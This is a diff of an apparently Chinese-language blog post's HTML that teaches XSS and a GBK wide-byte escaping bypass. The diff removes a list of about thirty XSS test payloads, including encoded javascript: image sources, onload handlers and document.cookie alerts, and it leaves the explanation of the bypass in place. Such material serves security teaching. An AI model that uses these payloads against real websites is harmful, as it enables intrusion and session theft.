@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">11.3k</span>
+            <span class="post-count">10.8k</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">42 分钟</span>
+            <span class="post-count">39 分钟</span>
         </span>
     </span>
 </div>
@@ -402,11 +402,7 @@
 <p>分析一下：</p>
 <p>%bf在GBK编码的高字节范围，与后台转义单引号（’）生成的斜杠（\）相结合，正好组成了汉字“縗”的GBK编码，这个时候斜杠对单引号的转义效果便失效了，当然了，现在一般都采用utf-8，这种漏洞环境就少见了。</p>
 <h5 id="5-多标签测试"><a href="#5-多标签测试" class="headerlink" title="5.多标签测试"></a>5.多标签测试</h5><p>能够触发弹窗效果的远不止&lt;script&gt;这一种标签</p>
-<p>各类语法如下：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt;&quot;&gt;&lt;iframe src=http://XXX.XXX&gt;</span><br><span class="line">&gt;&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))</span><br><span class="line">&gt;//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//</span><br><span class="line">&gt;--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line">&gt;&#x27;&#x27;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#x27;XSS&#x27;&quot;)`&gt;</span><br><span class="line">&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav??? ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&gt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&gt;%253cscript%253ealert(document.cookie)%253c/script%253e</span><br><span class="line">&gt;&#x27;; alert(document.cookie); var foo=&#x27;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>语句失效是难免的，主要是了解构造原理。</p>
+<p>而且语句失效是难免的，主要是了解构造原理。</p>
 <p>XSS语句的基本特点是利用各类JS脚本特性来设计触发点，攻击代码则可利用各类型编码或者外部引用方式进行加载。</p>
 <blockquote>
 <p>IE\Chrome\Firefox浏览器中的XSS Filter（针对XSS攻击的过滤器）包含语句非常全面。</p>
